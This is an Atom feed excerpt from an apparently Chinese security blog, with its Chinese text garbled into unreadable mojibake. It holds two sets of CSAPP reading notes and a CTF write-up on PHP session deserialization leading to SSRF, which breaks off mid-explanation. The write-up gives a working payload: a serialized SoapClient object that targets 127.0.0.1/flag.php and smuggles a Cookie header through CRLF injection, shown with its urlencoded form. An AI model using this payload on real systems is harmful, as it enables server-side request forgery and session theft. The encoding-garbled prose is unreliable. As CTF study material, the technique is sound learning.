    <content type="html"><![CDATA[<p>ä¿¡æ¯çš„è¡¨ç¤ºæ˜¯ä¿¡æ¯å¤„ç†çš„åŸºç¡€ã€‚</p><p>è®¡ç®—æœºå­˜å‚¨å’Œå¤„ç†çš„ä¿¡æ¯éƒ½æ˜¯ä»¥äºŒè¿›åˆ¶çš„å½¢å¼è¡¨ç¤ºï¼Œè¿™ä¸åº•å±‚çš„ç‰©ç†ç»“æ„æœ‰å…³ã€‚</p><blockquote><p>å•ä¸ªçš„ä½ä¸æ˜¯éå¸¸æœ‰ç”¨ï¼Œç„¶è€Œï¼Œå½“æŠŠä½ç»„åˆåœ¨ä¸€èµ·ï¼Œå†åŠ ä¸ŠæŸç§<em>è§£é‡Š</em>ï¼Œå³èµ‹äºˆä¸åŒçš„å¯èƒ½ä½æ¨¡å¼ä»¥å«ä¹‰ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿè¡¨ç¤ºä»»ä½•æœ‰é™é›†åˆçš„å…ƒç´ ã€‚</p></blockquote><p>è¿›ä¸€æ­¥çš„é—®é¢˜å°±æ˜¯ç¼–ç å’Œè§£ç ï¼Œæ¯”å¦‚æ•°æ®ä¸æ–‡å­—è¯¥å¦‚ä½•è¡¨ç¤ºï¼Ÿ</p><h2 id="ä¿¡æ¯å­˜å‚¨"><a href="#ä¿¡æ¯å­˜å‚¨" class="headerlink" title="ä¿¡æ¯å­˜å‚¨"></a>ä¿¡æ¯å­˜å‚¨</h2><p>å¤§å¤šæ•°è®¡ç®—æœºä½¿ç”¨ 8 ä½çš„å—ï¼Œä½œä¸ºæœ€å°çš„å¯å¯»å€çš„å†…å­˜å•ä½ï¼ˆå­—èŠ‚ï¼‰ï¼Œè€Œä¸æ˜¯è®¿é—®å†…å­˜ä¸­å•ç‹¬çš„ä½ã€‚æœºæ¢°çº§ç¨‹åºå°†å†…å­˜è§†ä¸ºä¸€ä¸ªéå¸¸å¤§çš„å­—èŠ‚æ•°ç»„ï¼Œç§°ä¸ºè™šæ‹Ÿå†…å­˜ã€‚å†…å­˜çš„æ¯ä¸ªå­—èŠ‚éƒ½ç”±ä¸€ä¸ªå”¯ä¸€çš„æ•°å­—æ¥æ ‡è¯†ï¼Œè¯¥æ•°å­—è¢«ç§°ä¸º<strong>åœ°å€</strong>ï¼Œæ‰€æœ‰å¯èƒ½åœ°å€çš„é›†åˆç§°ä¸º<strong>è™šæ‹Ÿåœ°å€ç©ºé—´</strong>ã€‚</p><p>åå…­è¿›åˆ¶è¡¨ç¤ºï¼Œè®°ä¸€ä¸‹ Aã€Cã€F å¯¹åº”çš„åè¿›åˆ¶å°±å¥½äº†ã€‚</p><blockquote><p>æ¯å½“æƒ³èµ·è¿™äº›ç®€å•çš„ç®—æ•°ã€é€»è¾‘è¿ç®—æ’‘èµ·äº†å¤æ‚æŠ½è±¡çš„ä¿¡æ¯å¤„ç†ï¼Œå°±ä¸å…æ„Ÿæ…¨å…¶ç¥å¥‡ï¼Œä¸‡ä¸ˆé«˜æ¥¼å¹³åœ°èµ·ã€‚</p></blockquote><h2 id="æ•´æ•°"><a href="#æ•´æ•°" class="headerlink" title="æ•´æ•°"></a>æ•´æ•°</h2><p>è¿™äº›æ•°å€¼è¡¨ç¤ºåŠå…¶è¿ç®—åœ¨å­¦ç»„åŸæ—¶å°±æ•´ç†è¿‡å¥½å‡ éäº†ï¼Œæ²¡ç»†çœ‹ï¼Œå›å¤´æƒ³èµ·å†è¡¥å……å§ã€‚</p><h2 id="æµ®ç‚¹æ•°"><a href="#æµ®ç‚¹æ•°" class="headerlink" title="æµ®ç‚¹æ•°"></a>æµ®ç‚¹æ•°</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ä¿¡æ¯çš„è¡¨ç¤ºæ˜¯ä¿¡æ¯å¤„ç†çš„åŸºç¡€ã€‚&lt;/p&gt;
&lt;p&gt;è®¡ç®—æœºå­˜å‚¨å’Œå¤„ç†çš„ä¿¡æ¯éƒ½æ˜¯ä»¥äºŒè¿›åˆ¶çš„å½¢å¼è¡¨ç¤ºï¼Œè¿™ä¸åº•å±‚çš„ç‰©ç†ç»“æ„æœ‰å…³ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;å•ä¸ªçš„ä½ä¸æ˜¯éå¸¸æœ‰ç”¨ï¼Œç„¶è€Œï¼Œå½“æŠŠä½ç»„åˆåœ¨ä¸€èµ·ï¼Œå†åŠ ä¸ŠæŸç§&lt;em&gt;è§£é‡Š&lt;/em&gt;ï¼Œå³èµ‹äºˆä¸åŒçš„å¯èƒ½ä½æ¨¡å¼ä»¥å«ä¹‰ï¼Œæˆ‘ä»¬å°±èƒ½
      
    
    </summary>
    
    
      <category term="è¯»ä¹¦ç¬”è®°" scheme="https://wywwzjj.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP è®¡ç®—æœºç³»ç»Ÿæ¼«æ¸¸ ç¬”è®°</title>
    <link href="https://wywwzjj.top/2019/09/01/CSAPP-Chapter-1-Notes/"/>
    <id>https://wywwzjj.top/2019/09/01/CSAPP-Chapter-1-Notes/</id>
    <published>2019-09-01T09:08:23.000Z</published>
    <updated>2019-10-11T13:46:17.090Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ä¿¡æ¯-ä½-ä¸Šä¸‹æ–‡"><a href="#ä¿¡æ¯-ä½-ä¸Šä¸‹æ–‡" class="headerlink" title="ä¿¡æ¯ = ä½ + ä¸Šä¸‹æ–‡"></a>ä¿¡æ¯ = ä½ + ä¸Šä¸‹æ–‡</h2><p>ç¼–ç æ˜¯ä¸€åˆ‡ä¿¡æ¯å¤„ç†çš„åŸºç¡€ã€‚</p><h2 id="ç¨‹åºè¢«å…¶ä»–ç¨‹åºç¿»è¯‘æˆä¸åŒçš„æ ¼å¼"><a href="#ç¨‹åºè¢«å…¶ä»–ç¨‹åºç¿»è¯‘æˆä¸åŒçš„æ ¼å¼" class="headerlink" title="ç¨‹åºè¢«å…¶ä»–ç¨‹åºç¿»è¯‘æˆä¸åŒçš„æ ¼å¼"></a>ç¨‹åºè¢«å…¶ä»–ç¨‹åºç¿»è¯‘æˆä¸åŒçš„æ ¼å¼</h2><p><strong>ç¼–è¯‘è¿‡ç¨‹ï¼š</strong></p><p>æºç¨‹åºï¼ˆhello.cï¼‰=&gt; é¢„å¤„ç†å™¨ ï¼ˆhello.iï¼‰ =&gt;  ç¼–è¯‘å™¨ï¼ˆhello.sï¼‰  =&gt;  æ±‡ç¼–å™¨ï¼ˆhello.oï¼‰  =&gt;  é“¾æ¥å™¨ï¼ˆå¯æ‰§è¡Œï¼‰</p><ul><li>é¢„å¤„ç†ï¼šä»¥ # å¼€å¤´çš„ï¼Œç›´æ¥ä¿®æ”¹æºç¨‹åºã€‚æ¯”å¦‚ #include &lt;stdio.h&gt;ï¼Œå°†ç›´æ¥æŠŠæ–‡ä»¶æ’å…¥è¿›æ¥ã€‚</li><li>ç¼–è¯‘å™¨ï¼šå°†æ­¤æ–‡æœ¬æ–‡ä»¶ç¿»è¯‘æˆæ±‡ç¼–è¯­å¥ã€‚</li><li>æ±‡ç¼–å™¨ï¼šå°†æ±‡ç¼–è¯­å¥ç¿»è¯‘æˆæœºå™¨è¯­è¨€æŒ‡ä»¤ã€‚</li><li>é“¾æ¥å™¨ï¼šå°†ç”¨åˆ°çš„é“¾æ¥åº“åˆå¹¶ã€‚</li></ul><h2 id="äº†è§£ç¼–è¯‘ç³»ç»Ÿå¦‚ä½•å·¥ä½œå¤§æœ‰ç›Šå¤„"><a href="#äº†è§£ç¼–è¯‘ç³»ç»Ÿå¦‚ä½•å·¥ä½œå¤§æœ‰ç›Šå¤„" class="headerlink" title="äº†è§£ç¼–è¯‘ç³»ç»Ÿå¦‚ä½•å·¥ä½œå¤§æœ‰ç›Šå¤„"></a>äº†è§£ç¼–è¯‘ç³»ç»Ÿå¦‚ä½•å·¥ä½œå¤§æœ‰ç›Šå¤„</h2><ul><li>ä¼˜åŒ–ç¨‹åºæ€§èƒ½</li><li>ç†è§£é“¾æ¥æ—¶å‡ºç°çš„é”™è¯¯</li><li>é¿å…å®‰å…¨æ¼æ´</li></ul><h2 id="å¤„ç†å™¨è¯»å¹¶è§£é‡Šå‚¨å­˜åœ¨å†…å­˜ä¸­çš„æŒ‡ä»¤"><a href="#å¤„ç†å™¨è¯»å¹¶è§£é‡Šå‚¨å­˜åœ¨å†…å­˜ä¸­çš„æŒ‡ä»¤" class="headerlink" title="å¤„ç†å™¨è¯»å¹¶è§£é‡Šå‚¨å­˜åœ¨å†…å­˜ä¸­çš„æŒ‡ä»¤"></a>å¤„ç†å™¨è¯»å¹¶è§£é‡Šå‚¨å­˜åœ¨å†…å­˜ä¸­çš„æŒ‡ä»¤</h2><h3 id="ç³»ç»Ÿçš„ç¡¬ä»¶ç»„æˆ"><a href="#ç³»ç»Ÿçš„ç¡¬ä»¶ç»„æˆ" class="headerlink" title="ç³»ç»Ÿçš„ç¡¬ä»¶ç»„æˆ"></a>ç³»ç»Ÿçš„ç¡¬ä»¶ç»„æˆ</h3><p>è®¡ç®—æœºï¼š</p><ul><li>ä»¥ç¡¬ä»¶ä¸ºåŸºç¡€</li><li>ä»¥è½¯ä»¶æ‰©å……å…¶åŠŸèƒ½</li><li>ä»¥æ‰§è¡Œç¨‹åºçš„æ–¹å¼æç°åŠŸèƒ½</li></ul><p>ç»„æˆï¼š</p><ul><li>æ€»çº¿ï¼šbusï¼Œå„éƒ¨ä»¶ä¿¡æ¯ä¼ è¾“çš„æ¸ é“</li><li>I/O è®¾å¤‡ï¼šè¾“å…¥è¾“å‡ºè®¾å¤‡ã€‚è¾“å…¥ä¿¡æ¯  =&gt;  å¤„ç†ä¿¡æ¯  =&gt;  è¾“å‡ºä¿¡æ¯</li><li>ä¸»å­˜</li><li>å¤„ç†å™¨</li></ul><h3 id="è¿è¡Œ-hello-ç¨‹åº"><a href="#è¿è¡Œ-hello-ç¨‹åº" class="headerlink" title="è¿è¡Œ hello ç¨‹åº"></a>è¿è¡Œ hello ç¨‹åº</h3><h2 id="é«˜é€Ÿç¼“å­˜è‡³å…³é‡è¦"><a href="#é«˜é€Ÿç¼“å­˜è‡³å…³é‡è¦" class="headerlink" title="é«˜é€Ÿç¼“å­˜è‡³å…³é‡è¦"></a>é«˜é€Ÿç¼“å­˜è‡³å…³é‡è¦</h2><h2 id="å­˜å‚¨è®¾å¤‡å½¢æˆå±‚æ¬¡ç»“æ„"><a href="#å­˜å‚¨è®¾å¤‡å½¢æˆå±‚æ¬¡ç»“æ„" class="headerlink" title="å­˜å‚¨è®¾å¤‡å½¢æˆå±‚æ¬¡ç»“æ„"></a>å­˜å‚¨è®¾å¤‡å½¢æˆå±‚æ¬¡ç»“æ„</h2><h2 id="æ“ä½œç³»ç»Ÿç®¡ç†ç¡¬ä»¶"><a href="#æ“ä½œç³»ç»Ÿç®¡ç†ç¡¬ä»¶" class="headerlink" title="æ“ä½œç³»ç»Ÿç®¡ç†ç¡¬ä»¶"></a>æ“ä½œç³»ç»Ÿç®¡ç†ç¡¬ä»¶</h2><h3 id="è¿›ç¨‹"><a href="#è¿›ç¨‹" class="headerlink" title="è¿›ç¨‹"></a>è¿›ç¨‹</h3><h3 id="çº¿ç¨‹"><a href="#çº¿ç¨‹" class="headerlink" title="çº¿ç¨‹"></a>çº¿ç¨‹</h3><p>ä¸€ä¸ªè¿›ç¨‹å¯ä»¥ç”±å¤šä¸ªçº¿ç¨‹æ„æˆï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½è¿è¡Œåœ¨è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œå¹¶å…±äº«åŒæ ·çš„ä»£ç å’Œå…¨å±€æ•°æ®ã€‚</p><h3 id="è™šæ‹Ÿå†…å­˜"><a href="#è™šæ‹Ÿå†…å­˜" class="headerlink" title="è™šæ‹Ÿå†…å­˜"></a>è™šæ‹Ÿå†…å­˜</h3><p>ä¸ºæ¯ä¸ªè¿›ç¨‹æä¾›äº†ä¸€ä¸ªå‡è±¡ï¼Œå°±å¥½åƒæ¯ä¸ªè¿›ç¨‹éƒ½ç‹¬å äº†ä¸»å­˜ã€‚</p><p>æ¯ä¸ªç¨‹åºæ‰§è¡Œæ—¶ï¼Œå†…å­˜èµ·ç‚¹éƒ½æ˜¯ä¸€æ ·çš„ã€‚</p><h3 id="æ–‡ä»¶"><a href="#æ–‡ä»¶" class="headerlink" title="æ–‡ä»¶"></a>æ–‡ä»¶</h3><h2 id="ç³»ç»Ÿä¹‹é—´åˆ©ç”¨ç½‘ç»œé€šä¿¡"><a href="#ç³»ç»Ÿä¹‹é—´åˆ©ç”¨ç½‘ç»œé€šä¿¡" class="headerlink" title="ç³»ç»Ÿä¹‹é—´åˆ©ç”¨ç½‘ç»œé€šä¿¡"></a>ç³»ç»Ÿä¹‹é—´åˆ©ç”¨ç½‘ç»œé€šä¿¡</h2><h2 id="Amdahl-å®šå¾‹"><a href="#Amdahl-å®šå¾‹" class="headerlink" title="Amdahl å®šå¾‹"></a>Amdahl å®šå¾‹</h2><h2 id="å¹¶å‘å’Œå¹¶è¡Œ"><a href="#å¹¶å‘å’Œå¹¶è¡Œ" class="headerlink" title="å¹¶å‘å’Œå¹¶è¡Œ"></a>å¹¶å‘å’Œå¹¶è¡Œ</h2><h2 id="æŠ½è±¡çš„é‡è¦æ€§"><a href="#æŠ½è±¡çš„é‡è¦æ€§" class="headerlink" title="æŠ½è±¡çš„é‡è¦æ€§"></a>æŠ½è±¡çš„é‡è¦æ€§</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ä¿¡æ¯-ä½-ä¸Šä¸‹æ–‡&quot;&gt;&lt;a href=&quot;#ä¿¡æ¯-ä½-ä¸Šä¸‹æ–‡&quot; class=&quot;headerlink&quot; title=&quot;ä¿¡æ¯ = ä½ + ä¸Šä¸‹æ–‡&quot;&gt;&lt;/a&gt;ä¿¡æ¯ = ä½ + ä¸Šä¸‹æ–‡&lt;/h2&gt;&lt;p&gt;ç¼–ç æ˜¯ä¸€åˆ‡ä¿¡æ¯å¤„ç†çš„åŸºç¡€ã€‚&lt;/p&gt;
&lt;h2 id=&quot;ç¨‹åºè¢«å…¶ä»–ç¨‹åºç¿»è¯‘æˆä¸åŒ
      
    
    </summary>
    
    
      <category term="è¯»ä¹¦ç¬”è®°" scheme="https://wywwzjj.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>å½“ PHP ååºåˆ—åŒ–é‡ä¸Š SSRF</title>
    <link href="https://wywwzjj.top/2019/08/20/%E5%BD%93PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%81%87%E4%B8%8ASSRF/"/>
    <id>https://wywwzjj.top/2019/08/20/å½“PHPååºåˆ—åŒ–é‡ä¸ŠSSRF/</id>
    <published>2019-08-20T06:08:23.000Z</published>
    <updated>2019-11-04T02:25:43.522Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SOAP-ç®€ä»‹"><a href="#SOAP-ç®€ä»‹" class="headerlink" title="SOAP ç®€ä»‹"></a>SOAP ç®€ä»‹</h2><p>SOAPï¼ˆSimple Object Access Protocolï¼‰æ˜¯ä¸€ç§åœ¨ web service é€šä¿¡æ—¶æ‰€ç”¨çš„åŸºäº xml çš„åè®®ã€‚</p><p>è¿œåœ¨å¤©è¾¹ï¼Œè¿‘åœ¨çœ¼å‰ï¼Œé€šè¿‡è¿™ç§åè®®å¯ä»¥å®ç°â€œæœ¬åœ°â€è°ƒç”¨çš„æ•ˆæœã€‚</p><p><strong>ç®€å•å®ä¾‹</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// soapServer</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTime</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> date(<span class="string">'Y-m-d'</span>, time());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$soap = <span class="keyword">new</span> SoapServer(<span class="keyword">null</span>,</span><br><span class="line">                      [<span class="string">'uri'</span> =&gt; <span class="string">'abcd'</span>]  <span class="comment">// namespace of the SOAP service</span></span><br><span class="line">                      );</span><br><span class="line">$soap-&gt;addFunction(<span class="string">'getTime'</span>);</span><br><span class="line">$soap-&gt;handle();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// soapClient</span></span><br><span class="line">$client = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,</span><br><span class="line">                        [<span class="string">'location'</span> =&gt; <span class="string">'http://example.com'</span>,  <span class="comment">// æœåŠ¡ç«¯ URL</span></span><br><span class="line">                         <span class="string">'uri'</span> =&gt; <span class="string">'abcd'</span>]  <span class="comment">// éœ€è¦ä¸æœåŠ¡ç«¯ä¸€è‡´ï¼ˆåªå‘èµ·è¯·æ±‚å¯ä»¥éšæ„å¡«ï¼‰</span></span><br><span class="line">                        );</span><br><span class="line"><span class="keyword">echo</span> $client-&gt;getTime();  <span class="comment">// å¾—åˆ°æœåŠ¡ç«¯æ‰€è¿”å›çš„æ—¶é—´</span></span><br><span class="line"><span class="comment">// è¿™é‡Œéå¸¸é‡è¦ï¼Œæ˜¯ååºåˆ—åŒ–åˆ° SSRF çš„æ ¸å¿ƒï¼ˆå®é™…æ“ä½œå¯è°ƒç”¨ä»»æ„æ–¹æ³•ï¼‰</span></span><br><span class="line"><span class="comment">// è¿™é‡Œè°ƒç”¨äº†æœªå®šä¹‰çš„æ–¹æ³•å°†å”¤èµ· __call é­”æœ¯æ–¹æ³•ï¼Œä»è€Œå‘ server ç«¯å‘èµ·ä¸€ä¸ªè¯·æ±‚ï¼Œå®ç° SSRF çš„æ•ˆæœ</span></span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„åˆ©ç”¨ç‚¹ï¼ŒCRLF å¤´æ³¨å…¥ï¼Œä¸€ä¸ªåœ¨ user_agentï¼Œä¸€ä¸ªåœ¨ uriï¼Œå¯æƒœçš„æ˜¯è¿™ç§æ–¹å¼åªæ”¯æŒ http åè®®ã€‚</p><p>ä¸‹é¢æ¥çœ‹ä¸€çœ‹å…·ä½“çš„æ•°æ®åŒ…ï¼š</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5y507mxzpj20lf07bt95.jpg" alt></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5y4o21s5fj20la08qt97.jpg" alt></p><p>ä¸ç†Ÿæ‚‰ CRLF å¤´æ³¨å…¥åˆ©ç”¨æ–¹æ³•çš„å¯ä»¥å‚è€ƒä¸€ä¸‹è¿™ç¯‡æ–‡ç« ï¼Œ<a href="https://wooyun.js.org/drops/Trying%20to%20hack%20Redis%20via%20HTTP%20requests.html" target="_blank" rel="noopener">Trying to hack Redis via HTTP requests</a></p><h2 id="ç›¸å…³ä¾‹é¢˜"><a href="#ç›¸å…³ä¾‹é¢˜" class="headerlink" title="ç›¸å…³ä¾‹é¢˜"></a>ç›¸å…³ä¾‹é¢˜</h2><h3 id="2018-LCTF-babyphpâ€™s-revenge"><a href="#2018-LCTF-babyphpâ€™s-revenge" class="headerlink" title="2018 LCTF babyphpâ€™s revenge"></a>2018 LCTF babyphpâ€™s revenge</h3><blockquote><p>hintï¼šååºåˆ—åŒ–</p></blockquote><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">'implode'</span>;</span><br><span class="line">call_user_func($_GET[f], $_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[name]))&#123;</span><br><span class="line">    $_SESSION[name] = $_GET[name];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION), <span class="string">'welcome_to_the_lctf2018'</span>);</span><br><span class="line">call_user_func($b, $a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">session_start(); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">'only localhost can get flag!'</span>;</span><br><span class="line">$flag = <span class="string">'LCTF&#123;*************************&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>] === <span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">    $_SESSION[<span class="string">'flag'</span>] = $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¢˜ç›®éå¸¸ç®€æ´ï¼Œå°±ä¸¤ä¸ªæ–‡ä»¶ã€‚flag çš„ä½ç½®ä¹Ÿå¾ˆæ˜ç¡®ï¼Œä½†è¿™æœ‰ä¸€ä¸ªé™åˆ¶ï¼Œåªæœ‰æ¥è‡ª localhost çš„è®¿é—®æ‰èƒ½å°† flag å†™å…¥ session ä¸­ï¼Œæ„å‘³ç€éœ€è¦ SSRF æˆ–è€…ç›´æ¥ getshellã€‚</p><p>ç»™çš„æç¤ºæ˜¯ååºåˆ—åŒ–ï¼Œä»£ç ä¸å¤šï¼Œä¸ç”±å¾—æƒ³åˆ° session é‡Œçš„ååºåˆ—åŒ–ï¼Œå¯ä»¥çœ‹çœ‹ä¹‹å‰çš„ä¸€ä¸ªé¢˜ï¼Œ<a href="https://wywwzjj.top/2019/02/25/Jarvis-OJ-phpinfo/">ä» session è§’åº¦å­¦ä¹ ååºåˆ—åŒ–</a> ï¼ˆä¸æ­¤é¢˜ä¸ç›¸åŒçš„ä¸€ç‚¹æ˜¯ï¼Œè¿™é‡Œç›´æ¥ç»™äº†å†™ session çš„æ¥å£ï¼Œä¸¤é¢˜æˆ–è®¸å¯ä»¥ç»“åˆä¸€ä¸‹ï¼‰</p><p>å‚ç…§ä»¥å‰çš„æ€è·¯ï¼Œæˆ‘ä»¬éœ€è¦è®¾ç½®ä¸åŒçš„åºåˆ—åŒ–çš„å¤„ç†å™¨ï¼Œæ¥è¾¾åˆ°å¯¹è±¡æ³¨å…¥çš„ç›®çš„ã€‚å¦‚ä½•æ‰èƒ½è®¾ç½®å‘¢ï¼Ÿ</p><p>ç›®å…‰ç»§ç»­èšç„¦äº <code>session_start</code> ï¼Œå®˜æ–¹æ–‡æ¡£ç»™äº†ä¸€ä¸ªé‡è¦æç¤ºï¼šé…ç½®å¯è¦†ç›–ï¼ˆè¯¥è¿›ç¨‹ä¸‹ä¸´æ—¶ç”Ÿæ•ˆå°±å¤Ÿäº†ï¼‰ã€‚</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5y600aa7cj20t90h6jut.jpg" alt></p><p>é‚£è¦æ³¨å…¥ä»€ä¹ˆè¦çš„å¯¹è±¡æ‰èƒ½è¾¾åˆ° SSRF çš„ç›®çš„å‘¢ï¼Ÿç”±äºä¸èƒ½å®šä¹‰å…¶ä»–ç±»ï¼Œåªå¥½ä»å†…ç½®ç±»æƒ³åŠæ³•ï¼Œè¿™æ—¶å€™ SoapClient å°±å¯ä»¥é—ªäº®ç™»åœºäº†ï¼Œä¸Šé¢å·²ç»é“ºå«äº†ç›¸å…³çŸ¥è¯†ï¼Œè¿™é‡Œç€é‡è§£é‡Šå¤„ç†æ‰‹æ³•ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, [<span class="string">'location'</span> =&gt; <span class="string">'http://127.0.0.1/flag.php'</span>,</span><br><span class="line">                           <span class="string">'uri'</span> =&gt; <span class="string">"DDD\r\n"</span> . <span class="string">"Cookie: PHPSESSID=2"</span>]);</span><br><span class="line">   <span class="comment">// åˆ«å¿˜äº†å¸¦ Cookieï¼Œä¸ç„¶å»å“ªçœ‹ flag ï¼š)</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br><span class="line"></span><br><span class="line"><span class="comment">//O%3A10%3A%22SoapClient%22%3A3%3A%7Bs%3A3%3A%22uri%22%3Bs%3A24%3A%22DDD%0D%0ACookie%3A+PHPSESSID%3D2%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span></span><br></pre></td></tr></table></figure><p>å¯çœ‹åˆ°è¯­å¥æˆåŠŸå†™å…¥ session</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5y6ncawvjj20yr0h2n0y.jpg" alt></p><p>å†æ­£å¸¸è®¿é—®ä¸€ä¸‹ï¼Œsession é‡Œçš„è¯­å¥è¢«æˆåŠŸååºåˆ—åŒ–æˆä¸º SoapClient å¯¹è±¡</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5y6pukr6vj20yo0hjn03.jpg" alt></p><p>æœ‰äººå¯èƒ½è¿˜æ˜¯ä¼šæœ‰ç–‘é—®ï¼Œä¸ºä»€ä¹ˆä¸€å®šè¦è¿™æ ·è®¾ç½®å‘¢ï¼Œä¸èƒ½èµ‹å€¼è¿›å»å†è‡ªåŠ¨ååºåˆ—åŒ–å—ï¼Ÿ</p><p>è¿™é‡Œå¤šè¯´ä¸€ä¸‹ï¼Œå…¶å®ä¸Šé¢çš„æ–‡ç« å·²ç»æœ‰å†™è¿‡ã€‚å…ˆçœ‹ä¸€ä¸‹åŸºæœ¬çš„å‡ ç§åºåˆ—åŒ–çš„å­˜å‚¨æ–¹å¼ï¼š</p><ul><li><code>php_binary</code>ï¼šé”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦ + é”®å + ç»è¿‡ <code>serialize ()</code> å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</li><li><code>php</code>ï¼šé”®å + ç«–çº¿ + ç»è¿‡ <code>serialize ()</code> å‡½æ•°åºåˆ—å¤„ç†çš„å€¼</li><li><code>php_serialize</code> ï¼šç»è¿‡ <code>serialize ()</code> å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</li></ul><p>ä» PHP æ–‡æ¡£å¯æŸ¥åˆ°ï¼Œé»˜è®¤ä½¿ç”¨ php è¿™ç§åºåˆ—åŒ–æ ¼å¼ï¼Œä¹Ÿå°±æ˜¯å·²ç»å­˜åœ¨ç«–çº¿çš„é‚£ç§æ–¹å¼ã€‚</p><p>è¿™ç§æ–¹å¼çš„ååºåˆ—åŒ–æœ‰ä¸ªå°ç»†èŠ‚ï¼šPHP è·å–åˆ° session å­—ç¬¦ä¸²åå°±å¼€å§‹ä»å·¦è‡³å³å¯»æ‰¾ç«–çº¿ï¼Œæ‰¾åˆ°åä»¥ç«–çº¿ä¸ºåˆ†éš”ç¬¦ï¼Œç«–çº¿å‰çš„ä¸ºé”®åï¼Œåçš„åšé”®å€¼ï¼Œå¹¶å¯¹é”®å€¼è¿›è¡Œååºåˆ—åŒ–ã€‚å¦‚æœååºåˆ—åŒ–å¤±è´¥ï¼Œåˆ™æ”¾å¼ƒæ­¤æ¬¡è§£æï¼Œå†ä»¥è¿™æ ·çš„æ–¹å¼ç½‘ä¸‹å¯»æ‰¾ç»§ç»­æ‰¾ã€‚</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">name</span>|<span class="selector-tag">s</span><span class="selector-pseudo">:163</span><span class="selector-pseudo">:"</span>|<span class="selector-tag">O</span><span class="selector-pseudo">:10</span><span class="selector-pseudo">:"SoapClient"</span><span class="selector-pseudo">:4</span>:&#123;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"uri"</span>;<span class="attribute">s</span>:<span class="number">1</span>:<span class="string">"a"</span>;<span class="attribute">s</span>:<span class="number">8</span>:<span class="string">"location"</span>...</span><br></pre></td></tr></table></figure><p>åƒç°åœ¨è¿™ç§æƒ…å†µï¼Œå‡ºç°äº†ä¸¤ä¸ªç«–çº¿ï¼Œå°±ä¼šå°†åé¢æ•´ä¸ª <code>s:163:&quot;O:&quot;</code> 